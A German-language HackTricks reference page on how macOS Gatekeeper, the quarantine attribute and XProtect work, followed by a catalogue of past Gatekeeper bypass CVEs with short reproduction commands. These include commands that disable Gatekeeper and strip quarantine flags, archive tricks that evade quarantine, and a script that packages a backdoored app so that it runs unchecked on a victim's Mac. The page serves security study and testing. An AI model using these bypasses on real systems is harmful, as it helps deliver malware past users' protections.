# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}

## Gatekeeper

**Gatekeeper** ist eine Sicherheitsfunktion, die für Mac-Betriebssysteme entwickelt wurde, um sicherzustellen, dass Benutzer **nur vertrauenswürdige Software** auf ihren Systemen ausführen. Es funktioniert, indem es **Software validiert**, die ein Benutzer herunterlädt und versucht zu öffnen, aus **Quellen außerhalb des App Store**, wie einer App, einem Plug-in oder einem Installationspaket.

Der Schlüsselmechanismus von Gatekeeper liegt in seinem **Überprüfungsprozess**. Es wird überprüft, ob die heruntergeladene Software **von einem anerkannten Entwickler signiert** ist, um die Authentizität der Software sicherzustellen. Darüber hinaus wird festgestellt, ob die Software **von Apple notariell beglaubigt** wurde, was bestätigt, dass sie frei von bekanntem schädlichem Inhalt ist und nach der Notarisierung nicht manipuliert wurde.

Zusätzlich verstärkt Gatekeeper die Benutzerkontrolle und Sicherheit, indem es **Benutzer auffordert, das Öffnen** heruntergeladener Software zum ersten Mal zu genehmigen. Diese Sicherheitsmaßnahme hilft, zu verhindern, dass Benutzer versehentlich potenziell schädlichen ausführbaren Code ausführen, den sie fälschlicherweise für eine harmlose Datendatei gehalten haben.

### Anwendungssignaturen

Anwendungssignaturen, auch bekannt als Codesignaturen, sind ein kritischer Bestandteil der Sicherheitsinfrastruktur von Apple. Sie werden verwendet, um **die Identität des Softwareautors** (des Entwicklers) zu überprüfen und sicherzustellen, dass der Code seit der letzten Signierung nicht manipuliert wurde.

So funktioniert es:

1. **Signieren der Anwendung:** Wenn ein Entwickler bereit ist, seine Anwendung zu verteilen, **signiert er die Anwendung mit einem privaten Schlüssel**. Dieser private Schlüssel ist mit einem **Zertifikat verbunden, das Apple dem Entwickler ausstellt**, wenn er sich im Apple Developer Program anmeldet. Der Signierungsprozess umfasst die Erstellung eines kryptografischen Hashs aller Teile der App und die Verschlüsselung dieses Hashs mit dem privaten Schlüssel des Entwicklers.
2. **Verteilen der Anwendung:** Die signierte Anwendung wird dann zusammen mit dem Zertifikat des Entwicklers verteilt, das den entsprechenden öffentlichen Schlüssel enthält.
3. **Überprüfen der Anwendung:** Wenn ein Benutzer die Anwendung herunterlädt und versucht, sie auszuführen, verwendet das Mac-Betriebssystem den öffentlichen Schlüssel aus dem Zertifikat des Entwicklers, um den Hash zu entschlüsseln. Es berechnet dann den Hash basierend auf dem aktuellen Zustand der Anwendung neu und vergleicht diesen mit dem entschlüsselten Hash. Wenn sie übereinstimmen, bedeutet dies, dass **die Anwendung seit der Signierung durch den Entwickler nicht verändert wurde**, und das System erlaubt es, die Anwendung auszuführen.

Anwendungssignaturen sind ein wesentlicher Bestandteil der Gatekeeper-Technologie von Apple. Wenn ein Benutzer versucht, **eine Anwendung zu öffnen, die aus dem Internet heruntergeladen wurde**, überprüft Gatekeeper die Anwendungssignatur. Wenn sie mit einem von Apple an einen bekannten Entwickler ausgestellten Zertifikat signiert ist und der Code nicht manipuliert wurde, erlaubt Gatekeeper die Ausführung der Anwendung. Andernfalls blockiert es die Anwendung und warnt den Benutzer.

Seit macOS Catalina **überprüft Gatekeeper auch, ob die Anwendung von Apple notariell beglaubigt wurde**, was eine zusätzliche Sicherheitsebene hinzufügt. Der Notarisierungsprozess überprüft die Anwendung auf bekannte Sicherheitsprobleme und schädlichen Code, und wenn diese Überprüfungen bestanden werden, fügt Apple der Anwendung ein Ticket hinzu, das Gatekeeper überprüfen kann.

#### Überprüfen von Signaturen

Beim Überprüfen einer **Malwareprobe** sollten Sie immer **die Signatur** der Binärdatei überprüfen, da der **Entwickler**, der sie signiert hat, möglicherweise bereits **mit Malware in Verbindung steht.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarisierung

Der Notarisierungsprozess von Apple dient als zusätzliche Sicherheitsmaßnahme, um Benutzer vor potenziell schädlicher Software zu schützen. Er umfasst das **Einreichen der Anwendung des Entwicklers zur Prüfung** durch **Apples Notary Service**, der nicht mit der App-Überprüfung verwechselt werden sollte. Dieser Dienst ist ein **automatisiertes System**, das die eingereichte Software auf das Vorhandensein von **schädlichem Inhalt** und mögliche Probleme mit der Code-Signierung überprüft.

Wenn die Software diese Inspektion ohne Bedenken **besteht**, generiert der Notary Service ein Notarisierungsticket. Der Entwickler ist dann verpflichtet, **dieses Ticket an seiner Software anzuhängen**, ein Prozess, der als 'Stapeln' bekannt ist. Darüber hinaus wird das Notarisierungsticket auch online veröffentlicht, wo Gatekeeper, Apples Sicherheitstechnologie, darauf zugreifen kann.

Bei der ersten Installation oder Ausführung der Software des Benutzers informiert die Existenz des Notarisierungstickets - ob an die ausführbare Datei angeheftet oder online gefunden - **Gatekeeper darüber, dass die Software von Apple notariert wurde**. Infolgedessen zeigt Gatekeeper eine beschreibende Nachricht im ersten Startdialog an, die darauf hinweist, dass die Software von Apple auf schädlichen Inhalt überprüft wurde. Dieser Prozess erhöht somit das Vertrauen der Benutzer in die Sicherheit der Software, die sie auf ihren Systemen installieren oder ausführen.

### spctl & syspolicyd

> [!CAUTION]
> Beachten Sie, dass ab der Sequoia-Version **`spctl`** keine Änderungen an der Gatekeeper-Konfiguration mehr zulässt.

**`spctl`** ist das CLI-Tool, um Gatekeeper aufzulisten und mit ihm zu interagieren (über den `syspolicyd`-Daemon via XPC-Nachrichten). Zum Beispiel ist es möglich, den **Status** von GateKeeper mit:
```bash
# Check the status
spctl --status
```
> [!CAUTION]
> Beachten Sie, dass die GateKeeper-Signaturprüfungen nur für **Dateien mit dem Quarantäneattribut** durchgeführt werden, nicht für jede Datei.

GateKeeper überprüft, ob gemäß den **Einstellungen & der Signatur** eine Binärdatei ausgeführt werden kann:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** ist der Hauptdaemon, der für die Durchsetzung von Gatekeeper verantwortlich ist. Er verwaltet eine Datenbank, die sich in `/var/db/SystemPolicy` befindet, und es ist möglich, den Code zur Unterstützung der [Datenbank hier](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp) und die [SQL-Vorlage hier](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql) zu finden. Beachten Sie, dass die Datenbank von SIP nicht eingeschränkt und von root beschreibbar ist und die Datenbank `/var/db/.SystemPolicy-default` als ursprüngliches Backup verwendet wird, falls die andere beschädigt wird.

Darüber hinaus enthalten die Bundles **`/var/db/gke.bundle`** und **`/var/db/gkopaque.bundle`** Dateien mit Regeln, die in die Datenbank eingefügt werden. Sie können diese Datenbank als root mit folgendem Befehl überprüfen:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** stellt auch einen XPC-Server mit verschiedenen Operationen wie `assess`, `update`, `record` und `cancel` zur Verfügung, die auch über die **`Security.framework`'s `SecAssessment*`** APIs erreichbar sind, und **`xpctl`** kommuniziert tatsächlich mit **`syspolicyd`** über XPC.

Beachten Sie, dass die erste Regel in "**App Store**" endete und die zweite in "**Developer ID**", und dass im vorherigen Bild **die Ausführung von Apps aus dem App Store und von identifizierten Entwicklern aktiviert war**.\
Wenn Sie diese Einstellung auf den App Store **ändern**, werden die "**Notarized Developer ID" Regeln verschwinden**.

Es gibt auch Tausende von Regeln vom **Typ GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Diese sind Hashes, die von:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Oder Sie könnten die vorherigen Informationen auflisten mit:
```bash
sudo spctl --list
```
Die Optionen **`--master-disable`** und **`--global-disable`** von **`spctl`** werden diese Signaturprüfungen vollständig **deaktivieren**:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Wenn vollständig aktiviert, wird eine neue Option erscheinen:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

Es ist möglich zu **überprüfen, ob eine App von GateKeeper erlaubt wird** mit:
```bash
spctl --assess -v /Applications/App.app
```
Es ist möglich, neue Regeln in GateKeeper hinzuzufügen, um die Ausführung bestimmter Apps zuzulassen mit:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Bezüglich **Kernel-Erweiterungen** enthält der Ordner `/var/db/SystemPolicyConfiguration` Dateien mit Listen von kexts, die geladen werden dürfen. Darüber hinaus hat `spctl` die Berechtigung `com.apple.private.iokit.nvram-csr`, da es in der Lage ist, neue vorab genehmigte Kernel-Erweiterungen hinzuzufügen, die ebenfalls in NVRAM unter einem `kext-allowed-teams` Schlüssel gespeichert werden müssen.

### Quarantäne-Dateien

Beim **Herunterladen** einer Anwendung oder Datei fügen spezifische macOS **Anwendungen** wie Webbrowser oder E-Mail-Clients **ein erweitertes Dateiattribut** hinzu, das allgemein als "**Quarantäne-Flag**" bekannt ist, zu der heruntergeladenen Datei. Dieses Attribut dient als Sicherheitsmaßnahme, um **die Datei** als von einer nicht vertrauenswürdigen Quelle (dem Internet) stammend zu kennzeichnen und potenziell Risiken zu tragen. Allerdings fügen nicht alle Anwendungen dieses Attribut hinzu; beispielsweise umgeht gängige BitTorrent-Client-Software normalerweise diesen Prozess.

**Das Vorhandensein eines Quarantäne-Flags signalisiert die Gatekeeper-Sicherheitsfunktion von macOS, wenn ein Benutzer versucht, die Datei auszuführen**.

Im Fall, dass das **Quarantäne-Flag nicht vorhanden ist** (wie bei Dateien, die über einige BitTorrent-Clients heruntergeladen wurden), werden die **Überprüfungen von Gatekeeper möglicherweise nicht durchgeführt**. Daher sollten Benutzer vorsichtig sein, wenn sie Dateien öffnen, die aus weniger sicheren oder unbekannten Quellen heruntergeladen wurden.

> [!NOTE] > **Die Überprüfung** der **Gültigkeit** von Codesignaturen ist ein **ressourcenintensiver** Prozess, der das Generieren kryptografischer **Hashes** des Codes und aller seiner gebündelten Ressourcen umfasst. Darüber hinaus beinhaltet die Überprüfung der Zertifikatsgültigkeit eine **Online-Überprüfung** bei den Apple-Servern, um zu sehen, ob es nach der Ausstellung widerrufen wurde. Aus diesen Gründen ist eine vollständige Überprüfung der Codesignatur und Notarisierung **unpraktisch, um sie jedes Mal auszuführen, wenn eine App gestartet wird**.
>
> Daher werden diese Überprüfungen **nur bei der Ausführung von Apps mit dem Quarantäneattribut durchgeführt.**

> [!WARNING]
> Dieses Attribut muss **von der Anwendung, die die Datei erstellt/herunterlädt**, gesetzt werden.
>
> Dateien, die sandboxed sind, haben dieses Attribut für jede Datei, die sie erstellen, gesetzt. Und nicht sandboxed Apps können es selbst setzen oder den [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) Schlüssel in der **Info.plist** angeben, was das System veranlasst, das `com.apple.quarantine` erweiterte Attribut auf den erstellten Dateien zu setzen.

Darüber hinaus sind alle Dateien, die von einem Prozess erstellt werden, der **`qtn_proc_apply_to_self`** aufruft, quarantiniert. Oder die API **`qtn_file_apply_to_path`** fügt dem angegebenen Dateipfad das Quarantäneattribut hinzu.

Es ist möglich, **den Status zu überprüfen und zu aktivieren/deaktivieren** (Root erforderlich) mit:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Sie können auch **herausfinden, ob eine Datei das Quarantäne-Erweiterungsattribut hat** mit:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Überprüfen Sie den **Wert** der **erweiterten** **Attribute** und finden Sie die App, die das Quarantäneattribut mit:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Tatsächlich könnte ein Prozess "Quarantäne-Flags auf die Dateien setzen, die er erstellt" (ich habe bereits versucht, das USER_APPROVED-Flag in einer erstellten Datei anzuwenden, aber es wird nicht angewendet):

<details>

<summary>Quellcode Quarantäne-Flags anwenden</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Und **entferne** dieses Attribut mit:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Und finden Sie alle quarantänisierten Dateien mit:
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
Quarantäneinformationen werden auch in einer zentralen Datenbank gespeichert, die von LaunchServices in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** verwaltet wird, was es der GUI ermöglicht, Daten über die Ursprünge der Datei zu erhalten. Darüber hinaus kann dies von Anwendungen überschrieben werden, die möglicherweise daran interessiert sind, ihre Ursprünge zu verbergen. Dies kann auch über die LaunchServices-APIs erfolgen.

#### **libquarantine.dylb**

Diese Bibliothek exportiert mehrere Funktionen, die es ermöglichen, die Felder der erweiterten Attribute zu manipulieren.

Die `qtn_file_*` APIs befassen sich mit den Quarantäne-Richtlinien für Dateien, die `qtn_proc_*` APIs werden auf Prozesse angewendet (Dateien, die von dem Prozess erstellt wurden). Die nicht exportierten `__qtn_syscall_quarantine*` Funktionen sind die, die die Richtlinien anwenden, die `mac_syscall` mit "Quarantine" als erstem Argument aufrufen, was die Anfragen an `Quarantine.kext` sendet.

#### **Quarantine.kext**

Die Kernel-Erweiterung ist nur über den **Kernel-Cache im System** verfügbar; Sie _können_ jedoch das **Kernel Debug Kit von** [**https://developer.apple.com/**](https://developer.apple.com/) herunterladen, das eine symbolisierte Version der Erweiterung enthält.

Dieses Kext wird über MACF mehrere Aufrufe hooken, um alle Datei-Lebenszyklusereignisse abzufangen: Erstellung, Öffnen, Umbenennen, Hard-Linking... sogar `setxattr`, um zu verhindern, dass das `com.apple.quarantine` erweiterte Attribut gesetzt wird.

Es verwendet auch einige MIBs:

- `security.mac.qtn.sandbox_enforce`: Quarantäne zusammen mit Sandbox durchsetzen
- `security.mac.qtn.user_approved_exec`: Quarantänierte Prozesse können nur genehmigte Dateien ausführen

### XProtect

XProtect ist eine integrierte **Anti-Malware**-Funktion in macOS. XProtect **überprüft jede Anwendung, wenn sie zum ersten Mal gestartet oder geändert wird, gegen seine Datenbank** bekannter Malware und unsicherer Dateitypen. Wenn Sie eine Datei über bestimmte Apps wie Safari, Mail oder Nachrichten herunterladen, scannt XProtect die Datei automatisch. Wenn sie mit bekannter Malware in seiner Datenbank übereinstimmt, wird XProtect **verhindern, dass die Datei ausgeführt wird** und Sie auf die Bedrohung hinweisen.

Die XProtect-Datenbank wird **regelmäßig** von Apple mit neuen Malware-Definitionen aktualisiert, und diese Updates werden automatisch auf Ihren Mac heruntergeladen und installiert. Dies stellt sicher, dass XProtect immer auf dem neuesten Stand der bekanntesten Bedrohungen ist.

Es ist jedoch erwähnenswert, dass **XProtect keine vollwertige Antivirus-Lösung ist**. Es überprüft nur eine spezifische Liste bekannter Bedrohungen und führt keine On-Access-Scans wie die meisten Antivirenprogramme durch.

Sie können Informationen über das neueste XProtect-Update abrufen, indem Sie Folgendes ausführen:
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
XProtect befindet sich an einem von SIP geschützten Ort unter **/Library/Apple/System/Library/CoreServices/XProtect.bundle** und im Inneren des Bundles finden Sie Informationen, die XProtect verwendet:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Erlaubt Code mit diesen cdhashes, Legacy-Berechtigungen zu verwenden.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Liste von Plugins und Erweiterungen, die über BundleID und TeamID oder durch Angabe einer Mindestversion nicht geladen werden dürfen.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Yara-Regeln zur Erkennung von Malware.
- **`XProtect.bundle/Contents/Resources/gk.db`**: SQLite3-Datenbank mit Hashes von blockierten Anwendungen und TeamIDs.

Beachten Sie, dass es eine weitere App in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** gibt, die mit XProtect in Verbindung steht, aber nicht am Gatekeeper-Prozess beteiligt ist.

### Nicht Gatekeeper

> [!CAUTION]
> Beachten Sie, dass Gatekeeper **nicht jedes Mal ausgeführt wird**, wenn Sie eine Anwendung ausführen, sondern nur _**AppleMobileFileIntegrity**_ (AMFI) **ausführbare Codesignaturen** überprüft, wenn Sie eine App ausführen, die bereits von Gatekeeper ausgeführt und überprüft wurde.

Daher war es zuvor möglich, eine App auszuführen, um sie mit Gatekeeper zu cachen, dann **nicht ausführbare Dateien der Anwendung zu modifizieren** (wie Electron asar oder NIB-Dateien), und wenn keine anderen Schutzmaßnahmen vorhanden waren, wurde die Anwendung mit den **bösartigen** Ergänzungen **ausgeführt**.

Jetzt ist dies jedoch nicht mehr möglich, da macOS **das Modifizieren von Dateien** innerhalb von Anwendungsbundles verhindert. Wenn Sie also den [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) Angriff versuchen, werden Sie feststellen, dass es nicht mehr möglich ist, ihn auszunutzen, da Sie nach dem Ausführen der App, um sie mit Gatekeeper zu cachen, das Bundle nicht mehr ändern können. Und wenn Sie beispielsweise den Namen des Contents-Verzeichnisses in NotCon ändern (wie im Exploit angegeben) und dann die Hauptbinärdatei der App ausführen, um sie mit Gatekeeper zu cachen, wird ein Fehler ausgelöst und sie wird nicht ausgeführt.

## Gatekeeper Umgehungen

Jede Möglichkeit, Gatekeeper zu umgehen (d.h. den Benutzer dazu zu bringen, etwas herunterzuladen und auszuführen, wenn Gatekeeper es ablehnen sollte), wird als Sicherheitsanfälligkeit in macOS betrachtet. Dies sind einige CVEs, die Techniken zugeordnet sind, die in der Vergangenheit ermöglichten, Gatekeeper zu umgehen:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Es wurde beobachtet, dass, wenn das **Archive Utility** zum Extrahieren verwendet wird, Dateien mit **Pfaden, die 886 Zeichen überschreiten**, das erweiterte Attribut com.apple.quarantine nicht erhalten. Diese Situation ermöglicht es versehentlich, dass diese Dateien die **Sicherheitsüberprüfungen von Gatekeeper** **umgehen**.

Überprüfen Sie den [**originalen Bericht**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) für weitere Informationen.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Wenn eine Anwendung mit **Automator** erstellt wird, befinden sich die Informationen darüber, was sie zur Ausführung benötigt, in `application.app/Contents/document.wflow`, nicht in der ausführbaren Datei. Die ausführbare Datei ist nur eine generische Automator-Binärdatei namens **Automator Application Stub**.

Daher könnten Sie `application.app/Contents/MacOS/Automator\ Application\ Stub` **mit einem symbolischen Link auf einen anderen Automator Application Stub im System verweisen** und es wird das ausführen, was sich in `document.wflow` (Ihr Skript) befindet, **ohne Gatekeeper auszulösen**, da die tatsächliche ausführbare Datei nicht das Quarantäne-xattr hat.

Beispiel für den erwarteten Speicherort: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Überprüfen Sie den [**originalen Bericht**](https://ronmasas.com/posts/bypass-macos-gatekeeper) für weitere Informationen.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Bei dieser Umgehung wurde eine Zip-Datei erstellt, die mit einer Anwendung begann, die von `application.app/Contents` anstelle von `application.app` komprimiert wurde. Daher wurde das **Quarantäne-Attribut** auf alle **Dateien von `application.app/Contents`** angewendet, aber **nicht auf `application.app`**, was Gatekeeper überprüfte, sodass Gatekeeper umgangen wurde, weil `application.app` ausgelöst wurde und **nicht das Quarantäneattribut hatte.**
```bash
zip -r test.app/Contents test.zip
```
Überprüfen Sie den [**originalen Bericht**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) für weitere Informationen.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Auch wenn die Komponenten unterschiedlich sind, ist die Ausnutzung dieser Schwachstelle sehr ähnlich zu der vorherigen. In diesem Fall werden wir ein Apple-Archiv aus **`application.app/Contents`** erstellen, sodass **`application.app` das Quarantäneattribut** beim Dekomprimieren durch **Archive Utility** nicht erhält.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Überprüfen Sie den [**originalen Bericht**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) für weitere Informationen.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Die ACL **`writeextattr`** kann verwendet werden, um zu verhindern, dass jemand ein Attribut in eine Datei schreibt:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Darüber hinaus kopiert das **AppleDouble**-Dateiformat eine Datei einschließlich ihrer ACEs.

Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die in der xattr gespeicherte ACL-Textdarstellung, die als **`com.apple.acl.text`** bezeichnet wird, als ACL in der dekomprimierten Datei gesetzt wird. Wenn Sie also eine Anwendung in eine Zip-Datei im **AppleDouble**-Dateiformat mit einer ACL komprimiert haben, die das Schreiben anderer xattrs verhindert... wurde die Quarantäne-xattr nicht in die Anwendung gesetzt:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
Überprüfen Sie den [**originalen Bericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) für weitere Informationen.

Bitte beachten Sie, dass dies auch mit AppleArchives ausgenutzt werden könnte:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Es wurde entdeckt, dass **Google Chrome das Quarantäneattribut** für heruntergeladene Dateien aufgrund einiger interner Probleme von macOS nicht gesetzt hat.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble-Dateiformate speichern die Attribute einer Datei in einer separaten Datei, die mit `._` beginnt, dies hilft, Dateiattribute **zwischen macOS-Maschinen** zu kopieren. Es wurde jedoch festgestellt, dass nach dem Dekomprimieren einer AppleDouble-Datei die Datei, die mit `._` beginnt, **nicht das Quarantäneattribut** erhielt.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
Die Möglichkeit, eine Datei zu erstellen, die nicht das Quarantäneattribut gesetzt hat, machte es **möglich, Gatekeeper zu umgehen.** Der Trick bestand darin, eine **DMG-Dateianwendung** unter Verwendung der AppleDouble-Namenskonvention (beginne mit `._`) zu erstellen und eine **sichtbare Datei als symbolischen Link zu dieser versteckten** Datei ohne das Quarantäneattribut zu erstellen.\
Wenn die **dmg-Datei ausgeführt wird**, wird sie, da sie kein Quarantäneattribut hat, **Gatekeeper umgehen.**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (aus diesem [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Erstellen Sie ein Verzeichnis, das eine App enthält.
- Fügen Sie uchg zur App hinzu.
- Komprimieren Sie die App in eine tar.gz-Datei.
- Senden Sie die tar.gz-Datei an ein Opfer.
- Das Opfer öffnet die tar.gz-Datei und führt die App aus.
- Gatekeeper überprüft die App nicht.

### Quarantäne xattr verhindern

In einem ".app" Bundle, wenn das Quarantäne-xattr nicht hinzugefügt wird, wird beim Ausführen **Gatekeeper nicht ausgelöst**.


{{#include ../../../banners/hacktricks-training.md}}
